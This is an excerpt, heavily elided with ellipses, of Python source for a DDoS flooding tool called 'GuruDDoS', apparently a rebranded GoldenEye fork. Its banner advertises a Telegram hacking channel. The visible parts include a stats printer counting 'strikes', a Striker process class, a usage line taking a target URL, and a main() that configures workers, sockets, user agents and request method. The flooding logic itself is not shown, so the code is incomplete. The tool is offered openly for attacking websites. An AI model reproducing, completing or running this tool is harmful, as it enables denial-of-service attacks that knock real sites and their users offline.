...
GOLDENEYE_BANNER = 'GURU DDOS ATTACK https://t.me/ANONYMOUS_HACKING_IND >'
    ...
    def stats(self):
        ...
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:
                ...
                print("{0} GuruDDoS strikes hit. ({1} Failed)".format(self.counter[0], self.counter[1]))
...
class Striker(Process):
    ...
    def run(self):
        ...
        if DEBUG:
            print("Starting DDoS {0}".format(self.name))
...
def usage():
    ...
    print()
    print(' USAGE: ./guruddos.py <url> [OPTIONS]')
    print()
    print(' OPTIONS:')
...
def main():
    ...
    try:
        ...
        guruddos = GuruDDoS(url)
        guruddos.useragents = useragents
        guruddos.nr_workers = workers
        guruddos.method = method
        guruddos.nr_sockets = socks
